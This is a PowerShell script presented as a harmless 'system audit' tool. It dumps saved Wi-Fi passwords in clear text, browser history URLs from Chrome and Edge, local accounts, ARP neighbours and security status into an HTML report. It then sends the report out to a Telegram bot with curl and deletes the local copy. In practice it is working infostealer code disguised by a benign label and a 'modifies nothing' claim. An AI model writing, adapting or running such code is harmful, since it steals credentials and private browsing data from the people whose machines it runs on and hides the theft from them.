# --- System Audit Pro v2 - Telegram Edition ---
# Audit + Wi-Fi + ARP + Historique navigateur + Envoi Telegram
# Ne modifie RIEN

$token = "TOKEN_ID"
$chatid = "CHAT_ID"
$reportPath = "$env:TEMP\audit_report.html"
$user = $env:USERNAME
$pc = $env:COMPUTERNAME
$date = Get-Date -Format "dd/MM/yyyy HH:mm:ss"

Add-Type -AssemblyName System.Web
function HtmlEncode($s) {
    if ($null -eq $s) { return "" }
    return [System.Web.HttpUtility]::HtmlEncode($s.ToString())
}

Write-Host "[*] Collecte en cours..." -ForegroundColor Cyan

# === SYSTEME ===
$os = Get-CimInstance Win32_OperatingSystem
$cs = Get-CimInstance Win32_ComputerSystem
$bios = Get-CimInstance Win32_BIOS
$uptime = (Get-Date) - $os.LastBootUpTime
$cpu = Get-CimInstance Win32_Processor | Select-Object -First 1
$ramGB = [math]::Round($cs.TotalPhysicalMemory / 1GB, 2)
$disks = Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"
$interfaces = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
    Where-Object { $_.IPAddress -notlike '127.*' }
$wifi = (netsh wlan show interfaces) -match '^\s+SSID' | Select-Object -First 1
$users = Get-CimInstance Win32_UserAccount -Filter "LocalAccount=True" |
    Select-Object Name, FullName, Disabled

$software = @()
$paths = @(
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
    "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*"
)
foreach ($path in $paths) {
    $software += Get-ItemProperty $path -ErrorAction SilentlyContinue |
        Where-Object { $_.DisplayName } |
        Select-Object DisplayName, DisplayVersion, Publisher
}
$software = $software | Sort-Object DisplayName -Unique | Select-Object -First 20

$processes = Get-Process | Sort-Object CPU -Descending |
    Select-Object -First 10 Name, Id, CPU, @{N='RAM_MB';E={[math]::Round($_.WorkingSet64/1MB,1)}}

$defender = Get-MpComputerStatus -ErrorAction SilentlyContinue
$firewall = Get-NetFirewallProfile -ErrorAction SilentlyContinue |
    Select-Object Name, Enabled

# === WIFI PASSWORDS (nécessite admin pour key=clear) ===
$wifiList = @()
$profiles = (netsh wlan show profiles) | Select-String "\:(.+)$" |
    ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
foreach ($p in $profiles) {
    $info = (netsh wlan show profile name="$p" key=clear)
    $line = $info | Select-String "Key Content|Contenu de la cl"
    $pwd = if ($line) { ($line -split ':')[1].Trim() } else { "(admin requis)" }
    $wifiList += [PSCustomObject]@{ SSID = $p; Password = $pwd }
}

# === RESEAU VOISIN (ARP) ===
$arpRaw = arp -a
$arpDevices = @()
foreach ($line in $arpRaw) {
    if ($line -match '^\s+(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F\-]{17})\s+(\S+)') {
        $arpDevices += [PSCustomObject]@{
            IP = $matches[1]
            MAC = $matches[2]
            Type = $matches[3]
        }
    }
}

# === HISTORIQUE NAVIGATEUR ===
$historyItems = @()
$browsers = @{
    "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
}
foreach ($b in $browsers.GetEnumerator()) {
    if (Test-Path $b.Value) {
        try {
            $tmpCopy = "$env:TEMP\hist_$($b.Key).db"
            Copy-Item $b.Value $tmpCopy -Force -ErrorAction Stop
            $conn = New-Object System.Data.SQLite.SQLiteConnection 2>$null
            # Sans SQLite, on lit en binaire les URLs
            $content = [System.IO.File]::ReadAllText($tmpCopy, [System.Text.Encoding]::UTF8)
            $urls = [regex]::Matches($content, 'https?://[^\x00-\x1F\s"''<>]{10,120}') |
                ForEach-Object { $_.Value } | Select-Object -Unique -First 15
            foreach ($u in $urls) {
                $historyItems += [PSCustomObject]@{ Browser = $b.Key; URL = $u }
            }
            Remove-Item $tmpCopy -Force -ErrorAction SilentlyContinue
        } catch { }
    }
}

# === HTML ===
$html = @"
<!DOCTYPE html>
<html lang="fr"><head><meta charset="UTF-8"><title>Audit - $pc</title>
<style>
body{font-family:'Segoe UI',Arial,sans-serif;background:#1e1e2e;color:#cdd6f4;margin:0;padding:20px}
.container{max-width:1200px;margin:0 auto}
h1{color:#89b4fa;border-bottom:3px solid #89b4fa;padding-bottom:10px}
h2{color:#f9e2af;margin-top:30px;border-left:4px solid #f9e2af;padding-left:10px}
table{width:100%;border-collapse:collapse;margin:10px 0;background:#313244;border-radius:8px;overflow:hidden}
th{background:#45475a;color:#f9e2af;padding:10px;text-align:left}
td{padding:8px 10px;border-bottom:1px solid #45475a}
tr:hover{background:#45475a}
.info-box{background:#313244;padding:15px;border-radius:8px;margin:10px 0;border-left:4px solid #89b4fa}
.label{color:#a6adc8;font-weight:bold}
.good{color:#a6e3a1}.bad{color:#f38ba8}.warn{color:#fab387}
.header-box{background:linear-gradient(135deg,#89b4fa,#cba6f7);padding:20px;border-radius:10px;margin-bottom:20px;color:#1e1e2e}
.footer{text-align:center;color:#6c7086;margin-top:40px;padding:20px;font-size:12px}
</style></head><body><div class="container">
<div class="header-box">
<h1 style="color:#1e1e2e;border:none;margin:0">🔍 Rapport d'Audit Système</h1>
<p style="margin:5px 0 0 0"><strong>$pc</strong> — Utilisateur : <strong>$user</strong> — $date</p>
</div>

<h2>💻 Système</h2><div class="info-box">
<div><span class="label">OS :</span> $(HtmlEncode $os.Caption)</div>
<div><span class="label">Version :</span> $(HtmlEncode $os.Version)</div>
<div><span class="label">Architecture :</span> $(HtmlEncode $os.OSArchitecture)</div>
<div><span class="label">Dernier démarrage :</span> $($os.LastBootUpTime)</div>
<div><span class="label">Uptime :</span> $($uptime.Days)j $($uptime.Hours)h $($uptime.Minutes)m</div>
</div>

<h2>⚙️ Matériel</h2><table>
<tr><th>Composant</th><th>Détail</th></tr>
<tr><td>CPU</td><td>$(HtmlEncode $cpu.Name) ($($cpu.NumberOfCores)c/$($cpu.NumberOfLogicalProcessors)t)</td></tr>
<tr><td>RAM</td><td>$ramGB GB</td></tr>
<tr><td>Fabricant</td><td>$(HtmlEncode $cs.Manufacturer)</td></tr>
<tr><td>Modèle</td><td>$(HtmlEncode $cs.Model)</td></tr>
<tr><td>BIOS</td><td>$(HtmlEncode $bios.Manufacturer) $(HtmlEncode $bios.SMBIOSBIOSVersion)</td></tr>
<tr><td>N° série</td><td>$(HtmlEncode $bios.SerialNumber)</td></tr>
</table>

<h2>💾 Disques</h2><table>
<tr><th>Lettre</th><th>Nom</th><th>Total</th><th>Libre</th><th>%</th></tr>
"@
foreach ($d in $disks) {
    $tGB = [math]::Round($d.Size / 1GB, 2); $fGB = [math]::Round($d.FreeSpace / 1GB, 2)
    $pct = [math]::Round((($d.Size - $d.FreeSpace) / $d.Size) * 100, 1)
    $cls = if ($pct -gt 90) { "bad" } elseif ($pct -gt 75) { "warn" } else { "good" }
    $html += "<tr><td>$($d.DeviceID)</td><td>$(HtmlEncode $d.VolumeName)</td><td>$tGB GB</td><td>$fGB GB</td><td class='$cls'>$pct%</td></tr>"
}
$html += "</table>"

$html += "<h2>🌐 Réseau</h2><table><tr><th>Interface</th><th>IP</th><th>DNS</th></tr>"
foreach ($i in $interfaces) {
    $dns = (Get-DnsClientServerAddress -InterfaceIndex $i.InterfaceIndex -ErrorAction SilentlyContinue).ServerAddresses -join ", "
    $html += "<tr><td>$(HtmlEncode $i.InterfaceAlias)</td><td>$($i.IPAddress)</td><td>$(HtmlEncode $dns)</td></tr>"
}
$html += "</table>"
if ($wifi) { $html += "<div class='info-box'><span class='label'>Wi-Fi :</span> $(HtmlEncode ($wifi -replace '^\s+SSID\s+:\s+',''))</div>" }

$html += "<h2>📡 Wi-Fi enregistrés</h2><table><tr><th>SSID</th><th>Mot de passe</th></tr>"
foreach ($w in $wifiList) {
    $cls = if ($w.Password -eq "(admin requis)") { "warn" } else { "good" }
    $html += "<tr><td>$(HtmlEncode $w.SSID)</td><td class='$cls'>$(HtmlEncode $w.Password)</td></tr>"
}
$html += "</table>"

$html += "<h2>🖥️ Réseau voisin (ARP)</h2><table><tr><th>IP</th><th>MAC</th><th>Type</th></tr>"
foreach ($a in $arpDevices) {
    $html += "<tr><td>$($a.IP)</td><td>$($a.MAC)</td><td>$($a.Type)</td></tr>"
}
$html += "</table>"

if ($historyItems.Count -gt 0) {
    $html += "<h2>🌍 Historique navigateur (extrait)</h2><table><tr><th>Navigateur</th><th>URL</th></tr>"
    foreach ($h in $historyItems) {
        $html += "<tr><td>$($h.Browser)</td><td>$(HtmlEncode $h.URL)</td></tr>"
    }
    $html += "</table>"
}

$html += "<h2>👤 Utilisateurs</h2><table><tr><th>Nom</th><th>Complet</th><th>État</th></tr>"
foreach ($u in $users) {
    $st = if ($u.Disabled) { "<span class='bad'>Désactivé</span>" } else { "<span class='good'>Actif</span>" }
    $html += "<tr><td>$(HtmlEncode $u.Name)</td><td>$(HtmlEncode $u.FullName)</td><td>$st</td></tr>"
}
$html += "</table>"

$html += "<h2>🛡️ Sécurité</h2><div class='info-box'>"
if ($defender) {
    $av = if ($defender.AntivirusEnabled) { "<span class='good'>Activé</span>" } else { "<span class='bad'>Désactivé</span>" }
    $rt = if ($defender.RealTimeProtectionEnabled) { "<span class='good'>Activée</span>" } else { "<span class='bad'>Désactivée</span>" }
    $html += "<div><span class='label'>Defender :</span> $av</div><div><span class='label'>Temps réel :</span> $rt</div>"
}
$html += "</div>"

if ($firewall) {
    $html += "<table><tr><th>Profil</th><th>État</th></tr>"
    foreach ($f in $firewall) {
        $st = if ($f.Enabled) { "<span class='good'>Activé</span>" } else { "<span class='bad'>Désactivé</span>" }
        $html += "<tr><td>$(HtmlEncode $f.Name)</td><td>$st</td></tr>"
    }
    $html += "</table>"
}

$html += "<h2>⚡ Top processus</h2><table><tr><th>Nom</th><th>PID</th><th>CPU</th><th>RAM MB</th></tr>"
foreach ($p in $processes) {
    $html += "<tr><td>$(HtmlEncode $p.Name)</td><td>$($p.Id)</td><td>$([math]::Round($p.CPU,1))</td><td>$($p.RAM_MB)</td></tr>"
}
$html += "</table>"

$html += "<h2>📦 Logiciels installés</h2><table><tr><th>Nom</th><th>Version</th><th>Éditeur</th></tr>"
foreach ($s in $software) {
    $html += "<tr><td>$(HtmlEncode $s.DisplayName)</td><td>$(HtmlEncode $s.DisplayVersion)</td><td>$(HtmlEncode $s.Publisher)</td></tr>"
}
$html += "</table>"

$html += "<div class='footer'>System Audit Pro v2 • $date • Aucune modification effectuée</div></div></body></html>"

$html | Out-File -FilePath $reportPath -Encoding UTF8
Write-Host "[+] Rapport généré : $reportPath" -ForegroundColor Green

# === ENVOI TELEGRAM ===
Write-Host "[*] Envoi sur Telegram..." -ForegroundColor Cyan
try {
    curl.exe -s -F "chat_id=$chatid" -F "document=@$reportPath" "https://api.telegram.org/bot$token/sendDocument" | Out-Null
    Write-Host "[+] Rapport envoyé sur Telegram !" -ForegroundColor Green
} catch {
    Write-Host "[!] Erreur d'envoi Telegram : $_" -ForegroundColor Red
}

# Nettoyage
Remove-Item $reportPath -Force -ErrorAction SilentlyContinue
